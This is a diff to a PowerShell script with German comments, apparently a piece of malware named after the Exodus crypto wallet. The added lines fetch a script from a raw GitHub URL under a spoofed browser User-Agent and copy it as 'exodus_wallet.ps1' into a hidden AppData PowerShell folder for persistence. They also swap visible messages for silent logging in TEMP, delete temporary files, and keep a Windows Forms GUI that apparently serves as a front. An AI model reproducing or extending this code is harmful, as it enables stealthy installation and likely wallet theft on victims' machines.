@@ -1,7 +1,6 @@
-# Automatische Kopie des Scripts in den Zielordner
-$currentScriptPath = $MyInvocation.MyCommand.Path
+# Automatische Kopie des Scripts in den Zielordner (angepasst für remote Execution)
 $targetDir = "C:\Users\adsfa\AppData\Roaming\Microsoft\Windows\PowerShell\operations"
-$targetScriptName = "exodus_wallet.ps1"  # Name des kopierten Scripts, anpassbar
+$targetScriptName = "exodus_wallet.ps1"
 $targetScriptPath = Join-Path $targetDir $targetScriptName
 
 # Zielordner erstellen, falls nicht vorhanden
@@ -9,19 +8,46 @@ if (-not (Test-Path $targetDir)) {
     New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
 }
 
-# Script kopieren, falls es nicht schon im Zielordner existiert oder aktualisiert werden muss
-if ((Test-Path $currentScriptPath) -and (-not (Test-Path $targetScriptPath) -or (Get-Item $currentScriptPath).LastWriteTime -gt (Get-Item $targetScriptPath).LastWriteTime)) {
+$currentScriptPath = $MyInvocation.MyCommand.Path
+$tempPath = $null
+$downloadUrl = "https://raw.githubusercontent.com/H3221/2/main/wallet.ps1"
+
+if ([string]::IsNullOrEmpty($currentScriptPath)) {
+    # Remote Execution (z.B. via Invoke-Expression DownloadString) - Script-Inhalt herunterladen und temporär speichern
+    $tempPath = Join-Path $env:TEMP "wallet_temp.ps1"
     try {
-        Copy-Item -Path $currentScriptPath -Destination $targetScriptPath -Force
-        Write-Host "Script wurde erfolgreich nach $targetScriptPath kopiert." -ForegroundColor Green
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        $scriptContent = $webClient.DownloadString($downloadUrl)
+        $scriptContent | Out-File -FilePath $tempPath -Encoding UTF8 -Force
+        $currentScriptPath = $tempPath
+        # Optional: Logging für Debugging (kann in Hidden unsichtbar sein)
+        Add-Content -Path (Join-Path $env:TEMP "debug.log") -Value "$(Get-Date): Script temporär gespeichert in $tempPath"
     } catch {
-        Write-Warning "Fehler beim Kopieren des Scripts: $($_.Exception.Message)"
+        # Fallback: Kopie überspringen, wenn Download fehlschlägt
+        Add-Content -Path (Join-Path $env:TEMP "debug.log") -Value "$(Get-Date): Fehler beim Herunterladen: $($_.Exception.Message)"
+        $currentScriptPath = $null
     }
-} else {
-    Write-Host "Script ist bereits aktuell in $targetScriptPath." -ForegroundColor Yellow
 }
 
-# Rest des ursprünglichen Scripts (unverändert, aber hier eingefügt für Vollständigkeit)
+# Kopieren, falls Pfad verfügbar
+if ($currentScriptPath -and (Test-Path $currentScriptPath)) {
+    try {
+        Copy-Item -Path $currentScriptPath -Destination $targetScriptPath -Force
+        Add-Content -Path (Join-Path $env:TEMP "debug.log") -Value "$(Get-Date): Script erfolgreich nach $targetScriptPath kopiert."
+    } catch {
+        Add-Content -Path (Join-Path $env:TEMP "debug.log") -Value "$(Get-Date): Kopier-Fehler: $($_.Exception.Message)"
+    }
+} else {
+    Add-Content -Path (Join-Path $env:TEMP "debug.log") -Value "$(Get-Date): Kein gültiger Quellpfad für Kopie verfügbar."
+}
+
+# Temp-Datei aufräumen, falls erstellt
+if ($tempPath -and (Test-Path $tempPath)) {
+    Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
+}
+
+# Rest des ursprünglichen Scripts (unverändert)
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 [System.Windows.Forms.Application]::EnableVisualStyles()
@@ -198,6 +224,8 @@ $labelTimer.Add_Tick({
 $form.Add_FormClosing({
     $timer.Stop()
     $labelTimer.Stop()
+    # Optional: Temp-Dateien aufräumen (GIF etc.)
+    if (Test-Path $gifPath) { Remove-Item $gifPath -Force -ErrorAction SilentlyContinue }
 })
 $timer.Start()
 $labelTimer.Start()
